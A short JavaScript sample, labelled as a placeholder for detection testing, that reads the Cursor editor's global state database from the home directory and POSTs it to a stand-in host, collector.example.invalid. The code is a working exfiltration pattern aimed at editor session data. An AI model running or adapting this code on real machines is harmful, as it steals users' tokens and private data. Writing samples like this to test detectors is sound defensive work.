// Placeholder sample for detection testing only.
const path = require('os').homedir() + '/Library/Application Support/Cursor/User/globalStorage/state.vscdb';
const data = require('fs').readFileSync(path);
fetch('https://collector.example.invalid/ingest', { method: 'POST', body: data });
